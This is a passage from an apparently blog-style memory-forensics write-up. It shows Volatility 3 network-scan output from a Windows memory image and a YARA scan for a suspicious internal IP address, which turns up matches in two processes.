</span></span><span style="display:flex;"><span>0xc40aa5395940  TCPv4   0.0.0.0 <span style="color:#bd93f9">49676</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">636</span>     lsass.exe       2023-10-31 13:31:07.000000 
</span></span><span style="display:flex;"><span>0xc40aa5395a90  TCPv4   0.0.0.0 <span style="color:#bd93f9">49666</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">1208</span>    svchost.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa5395a90  TCPv6   ::      <span style="color:#bd93f9">49666</span>   ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">1208</span>    svchost.exe     2023-10-31 13:30:57.000000 
</span></span><span style="display:flex;"><span>0xc40aa5395be0  UDPv4   0.0.0.0 <span style="color:#bd93f9">0</span>       *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1876</span>    svchost.exe     2023-10-31 13:30:58.000000 
</span></span><span style="display:flex;"><span>0xc40aa5395be0  UDPv6   ::      <span style="color:#bd93f9">0</span>       *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1876</span>    svchost.exe     2023-10-31 13:30:58.000000 
</span></span><span style="display:flex;"><span>0xc40aa5395d30  TCPv6   ::1     <span style="color:#bd93f9">8888</span>    ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">2896</span>    python.exe      2023-10-31 13:37:16.000000 
</span></span><span style="display:flex;"><span>0xc40aa58f3050  TCPv4   0.0.0.0 <span style="color:#bd93f9">49668</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">620</span>     services.exe    2023-10-31 13:30:59.000000 
</span></span><span style="display:flex;"><span>0xc40aa58f3ec0  UDPv4   0.0.0.0 <span style="color:#bd93f9">5050</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">3728</span>    svchost.exe     2023-10-31 13:31:00.000000 
</span></span><span style="display:flex;"><span>0xc40aa58f4160  UDPv4   127.0.0.1       <span style="color:#bd93f9">64872</span>   *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">3236</span>    svchost.exe     2023-10-31 13:30:59.000000 
</span></span><span style="display:flex;"><span>0xc40aa58f4940  TCPv4   0.0.0.0 <span style="color:#bd93f9">445</span>     0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">4</span>       System  2023-10-31 13:30:59.000000 
</span></span><span style="display:flex;"><span>0xc40aa58f4940  TCPv6   ::      <span style="color:#bd93f9">445</span>     ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">4</span>       System  2023-10-31 13:30:59.000000 
</span></span><span style="display:flex;"><span>0xc40aa58f4a90  TCPv4   0.0.0.0 <span style="color:#bd93f9">49668</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">620</span>     services.exe    2023-10-31 13:30:59.000000 
</span></span><span style="display:flex;"><span>0xc40aa58f4a90  TCPv6   ::      <span style="color:#bd93f9">49668</span>   ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">620</span>     services.exe    2023-10-31 13:30:59.000000 
</span></span><span style="display:flex;"><span>0xc40aa5ac6530  TCPv4   127.0.0.1       <span style="color:#bd93f9">49867</span>   127.0.0.1       <span style="color:#bd93f9">49868</span>   ESTABLISHED     -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aa5d25a30  TCPv4   192.168.157.144 <span style="color:#bd93f9">50043</span>   142.250.187.206 <span style="color:#bd93f9">443</span>     ESTABLISHED     -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aa5efe050  TCPv6   ::1     <span style="color:#bd93f9">14147</span>   ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">11048</span>   FileZillaServe  2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa5efe1a0  TCPv6   7f00:1::9870:b5a1:ac4:ffff      <span style="color:#bd93f9">8005</span>    ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">2696</span>    java.exe        2023-10-31 13:37:50.000000 
</span></span><span style="display:flex;"><span>0xc40aa5efe2f0  TCPv4   0.0.0.0 <span style="color:#bd93f9">443</span>     0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">11204</span>   httpd.exe       2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa5efe2f0  TCPv6   ::      <span style="color:#bd93f9">443</span>     ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">11204</span>   httpd.exe       2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa5efe590  UDPv4   0.0.0.0 <span style="color:#bd93f9">0</span>       *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">6772</span>    powershell.exe  2023-10-31 13:42:37.000000 
</span></span><span style="display:flex;"><span>0xc40aa5efe830  TCPv4   0.0.0.0 <span style="color:#bd93f9">7680</span>    0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">8444</span>    svchost.exe     2023-10-31 13:32:59.000000 
</span></span><span style="display:flex;"><span>0xc40aa5efe830  TCPv6   ::      <span style="color:#bd93f9">7680</span>    ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">8444</span>    svchost.exe     2023-10-31 13:32:59.000000 
</span></span><span style="display:flex;"><span>0xc40aa5efe980  TCPv4   0.0.0.0 <span style="color:#bd93f9">21</span>      0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">11048</span>   FileZillaServe  2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa5efed70  TCPv4   0.0.0.0 <span style="color:#bd93f9">443</span>     0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">11204</span>   httpd.exe       2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa5eff160  TCPv4   127.0.0.1       <span style="color:#bd93f9">14147</span>   0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">11048</span>   FileZillaServe  2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa5eff400  TCPv4   0.0.0.0 <span style="color:#bd93f9">8080</span>    0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">2696</span>    java.exe        2023-10-31 13:37:48.000000 
</span></span><span style="display:flex;"><span>0xc40aa5eff400  TCPv6   ::      <span style="color:#bd93f9">8080</span>    ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">2696</span>    java.exe        2023-10-31 13:37:48.000000 
</span></span><span style="display:flex;"><span>0xc40aa5effd30  TCPv4   0.0.0.0 <span style="color:#bd93f9">3306</span>    0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">5212</span>    mysqld.exe      2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa5effd30  TCPv6   ::      <span style="color:#bd93f9">3306</span>    ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">5212</span>    mysqld.exe      2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa5effe80  TCPv4   0.0.0.0 <span style="color:#bd93f9">21</span>      0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">11048</span>   FileZillaServe  2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa5effe80  TCPv6   ::      <span style="color:#bd93f9">21</span>      ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">11048</span>   FileZillaServe  2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fc1a0  UDPv6   ::1     <span style="color:#bd93f9">1900</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">8140</span>    svchost.exe     2023-10-31 13:31:20.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fc2f0  UDPv6   ::1     <span style="color:#bd93f9">56182</span>   *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">8140</span>    svchost.exe     2023-10-31 13:31:20.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fc440  UDPv4   127.0.0.1       <span style="color:#bd93f9">1900</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">8140</span>    svchost.exe     2023-10-31 13:31:20.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fc6e0  UDPv4   192.168.157.144 <span style="color:#bd93f9">56183</span>   *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">8140</span>    svchost.exe     2023-10-31 13:31:20.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fcad0  UDPv4   192.168.157.144 <span style="color:#bd93f9">1900</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">8140</span>    svchost.exe     2023-10-31 13:31:20.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fd6a0  UDPv6   fe80::a94d:3c5d:b0c7:221b       <span style="color:#bd93f9">56181</span>   *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">8140</span>    svchost.exe     2023-10-31 13:31:20.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fd7f0  UDPv4   127.0.0.1       <span style="color:#bd93f9">56184</span>   *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">8140</span>    svchost.exe     2023-10-31 13:31:20.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fd940  TCPv4   127.0.0.1       <span style="color:#bd93f9">8888</span>    0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">2896</span>    python.exe      2023-10-31 13:37:16.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fda90  UDPv6   fe80::a94d:3c5d:b0c7:221b       <span style="color:#bd93f9">1900</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">8140</span>    svchost.exe     2023-10-31 13:31:20.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fdd30  TCPv4   0.0.0.0 <span style="color:#bd93f9">80</span>      0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">11204</span>   httpd.exe       2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fde80  TCPv4   0.0.0.0 <span style="color:#bd93f9">80</span>      0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">11204</span>   httpd.exe       2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa60fde80  TCPv6   ::      <span style="color:#bd93f9">80</span>      ::      <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">11204</span>   httpd.exe       2023-10-31 13:37:41.000000 
</span></span><span style="display:flex;"><span>0xc40aa615a980  TCPv4   0.0.0.0 <span style="color:#bd93f9">5040</span>    0.0.0.0 <span style="color:#bd93f9">0</span>       LISTENING       <span style="color:#bd93f9">3728</span>    svchost.exe     2023-10-31 13:31:02.000000 
</span></span><span style="display:flex;"><span>0xc40aa6b569a0  TCPv4   192.168.157.144 <span style="color:#bd93f9">49772</span>   20.90.152.133   <span style="color:#bd93f9">443</span>     ESTABLISHED     -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aa6f40b50  TCPv4   127.0.0.1       <span style="color:#bd93f9">49868</span>   127.0.0.1       <span style="color:#bd93f9">49867</span>   ESTABLISHED     -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aa9005bf0  TCPv4   127.0.0.1       <span style="color:#bd93f9">14147</span>   127.0.0.1       <span style="color:#bd93f9">49889</span>   ESTABLISHED     -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aa90e0bf0  TCPv4   127.0.0.1       <span style="color:#bd93f9">49889</span>   127.0.0.1       <span style="color:#bd93f9">14147</span>   ESTABLISHED     -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aa912ebe0  TCPv4   192.168.157.144 <span style="color:#bd93f9">50042</span>   216.58.204.67   <span style="color:#bd93f9">443</span>     ESTABLISHED     -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aa98d66a0  TCPv4   192.168.157.144 <span style="color:#bd93f9">49920</span>   95.101.243.61   <span style="color:#bd93f9">443</span>     CLOSED  -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aa98e1950  TCPv4   192.168.157.144 <span style="color:#bd93f9">49921</span>   95.101.63.170   <span style="color:#bd93f9">443</span>     CLOSED  -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aa99986d0  TCPv4   192.168.157.144 <span style="color:#bd93f9">50045</span>   13.107.21.200   <span style="color:#bd93f9">443</span>     ESTABLISHED     -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aaa0fa050  UDPv4   0.0.0.0 <span style="color:#bd93f9">0</span>       *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">6772</span>    powershell.exe  2023-10-31 13:42:37.000000 
</span></span><span style="display:flex;"><span>0xc40aaa0fa050  UDPv6   ::      <span style="color:#bd93f9">0</span>       *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">6772</span>    powershell.exe  2023-10-31 13:42:37.000000 
</span></span><span style="display:flex;"><span>0xc40aaa0fa1a0  UDPv4   0.0.0.0 <span style="color:#bd93f9">5355</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1876</span>    svchost.exe     2023-10-31 13:55:22.000000 
</span></span><span style="display:flex;"><span>0xc40aaa0fa440  UDPv4   0.0.0.0 <span style="color:#bd93f9">5353</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">8048</span>    chrome.exe      2023-10-31 13:55:31.000000 
</span></span><span style="display:flex;"><span>0xc40aaa0fa590  UDPv4   0.0.0.0 <span style="color:#bd93f9">0</span>       *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">6772</span>    powershell.exe  2023-10-31 13:42:37.000000 
</span></span><span style="display:flex;"><span>0xc40aaa0fac20  UDPv4   0.0.0.0 <span style="color:#bd93f9">5353</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">8048</span>    chrome.exe      2023-10-31 13:55:31.000000 
</span></span><span style="display:flex;"><span>0xc40aaa0fac20  UDPv6   ::      <span style="color:#bd93f9">5353</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">8048</span>    chrome.exe      2023-10-31 13:55:31.000000 
</span></span><span style="display:flex;"><span>0xc40aaa0fb160  UDPv4   0.0.0.0 <span style="color:#bd93f9">5355</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1876</span>    svchost.exe     2023-10-31 13:55:22.000000 
</span></span><span style="display:flex;"><span>0xc40aaa0fb160  UDPv6   ::      <span style="color:#bd93f9">5355</span>    *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1876</span>    svchost.exe     2023-10-31 13:55:22.000000 
</span></span><span style="display:flex;"><span>0xc40aaa0fba90  UDPv4   0.0.0.0 <span style="color:#bd93f9">0</span>       *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">6772</span>    powershell.exe  2023-10-31 13:42:37.000000 
</span></span><span style="display:flex;"><span>0xc40aaa0fba90  UDPv6   ::      <span style="color:#bd93f9">0</span>       *       <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">6772</span>    powershell.exe  2023-10-31 13:42:37.000000 
</span></span><span style="display:flex;"><span>0xc40aaa5d7920  TCPv4   192.168.157.144 <span style="color:#bd93f9">50044</span>   204.79.197.222  <span style="color:#bd93f9">443</span>     ESTABLISHED     -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aaa7f79a0  TCPv4   192.168.157.144 <span style="color:#bd93f9">50037</span>   192.168.157.151 <span style="color:#bd93f9">4545</span>    ESTABLISHED     -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aaa8cb8a0  TCPv4   192.168.157.144 <span style="color:#bd93f9">50041</span>   216.58.204.78   <span style="color:#bd93f9">443</span>     ESTABLISHED     -       -       N/A
</span></span><span style="display:flex;"><span>0xc40aaa8d7920  TCPv4   192.168.157.144 <span style="color:#bd93f9">50039</span>   20.31.169.57    <span style="color:#bd93f9">443</span>     CLOSED  -       -       N/A
</span></span></code></pre></div><p>I tried to find the malicious process but I couldn&rsquo;t find any weird looking process. My mind tricked me. So, I did a IP IoC search using yara.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ vol3 -f memory_dump.vmem windows.vadyarascan --yara-rules <span style="color:#f1fa8c">&#34;192.168.157.151&#34;</span>
</span></span><span style="display:flex;"><span>Volatility <span style="color:#bd93f9">3</span> Framework 2.7.1
</span></span><span style="display:flex;"><span>Progress:  100.00               PDB scanning finished                        
</span></span><span style="display:flex;"><span>Offset  PID     Rule    Component       Value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0x12326865bdb   <span style="color:#bd93f9">3360</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x12330fabadb   <span style="color:#bd93f9">3360</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x12330fadaa0   <span style="color:#bd93f9">3360</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x12330fb7b1e   <span style="color:#bd93f9">3360</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x12330fb9ae0   <span style="color:#bd93f9">3360</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x123373fc8a0   <span style="color:#bd93f9">3360</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x1233f9c69f0   <span style="color:#bd93f9">3360</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x61008b        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x6100e3        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x61013b        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x61034b        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x6105b3        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x6106c9        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x6108a1        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x6108ec        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x61093c        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x6109dc        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x610a31        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x610b6c        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x610bc1        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x610c11        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x610c61        <span style="color:#bd93f9">11048</span>   r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
